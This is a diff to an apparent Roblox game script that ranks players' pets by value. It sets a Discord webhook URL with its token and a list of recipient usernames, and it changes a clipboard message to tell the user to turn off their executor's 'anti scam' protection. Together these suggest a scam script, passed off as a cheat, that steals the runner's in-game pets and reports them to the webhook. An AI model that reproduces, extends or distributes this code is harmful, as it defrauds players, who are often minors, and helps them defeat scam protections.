@@ -1,5 +1,5 @@
 getgenv().Webhook = "https://discord.com/api/webhooks/1407326022176608267/_7XNS9c-LNZLjKHjB-c03xp9_FBexx92Kz7eYA6s-aMWHFzPbeEVAaEtMwPRySmJW5Yv"
-getgenv().Username = {"BEESUCALL", "Terensszxc", "Kuni_Loot", "Kuni_Loot1"}
+getgenv().Username = {"BEESUCALL", "Terensszxc", "Elaine_Pets", "Kuni_Loot"}
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -18,7 +18,7 @@ getgenv().Username = {"BEESUCALL", "Terensszxc", "Kuni_Loot", "Kuni_Loot1"}
         local attempt = 1
         local teleported = false
 
-        setclipboard("TRY IT AGAIN")
+        setclipboard("TURN OFF YOUR DELTA ANTI SCAM TO ENJOY THE SCRIPT!")
 
         
         if GetServerType:InvokeServer() == "VIPServer" then
@@ -74,7 +74,7 @@ getgenv().Username = {"BEESUCALL", "Terensszxc", "Kuni_Loot", "Kuni_Loot1"}
                 ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
                 ["Raccoon"] = { priority = 2, emoji = "🦝", isMutation = false },
                 ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
-                ["Fennec Fox"] = { priority = 4, emoji = "🦊", isMutation = false },
+                ["Fennec fox"] = { priority = 4, emoji = "🦊", isMutation = false },
                 ["Butterfly"] = { priority = 5, emoji = "🦋", isMutation = false },
                 ["Dragonfly"] = { priority = 6, emoji = "🐲", isMutation = false },
                 ["Mimic Octopus"] = { priority = 7, emoji = "🐙", isMutation = false },
@@ -82,8 +82,6 @@ getgenv().Username = {"BEESUCALL", "Terensszxc", "Kuni_Loot", "Kuni_Loot1"}
                 ["Spinosaurus"] = { priority = 10, emoji = "🫎", isMutation = false },
                 ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
                 ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
-                ["Lobster Thermidor"] = { priority = 8, emoji = "🦞", isMutation = false },
-        `       ["French Fry Ferret"] = { priority = 12, emoji = "🍟", isMutation = false },
                 -- Mutations
                 ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
                 ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
@@ -225,15 +223,14 @@ getgenv().Username = {"BEESUCALL", "Terensszxc", "Kuni_Loot", "Kuni_Loot1"}
                     
                     local strippedName = petName:gsub(" %[.*%]", "")
 
-                   function stripMutationPrefix(name)
-  for key, data in pairs(PetPriorityData) do
-    if data.isMutation and name:lower():find(key:lower()) == 1 then
-      return name:sub(#key + 2)
-    end
-  end
-  return name
-end
-
+                    local function stripMutationPrefix(name)
+                        for key, data in pairs(PetPriorityData) do
+                            if data.isMutation and name:lower():find(key:lower()) == 1 then
+                                return name:sub(#key + 2)
+                            end
+                        end
+                        return name
+                    end
 
                     local petType = stripMutationPrefix(strippedName)
                     
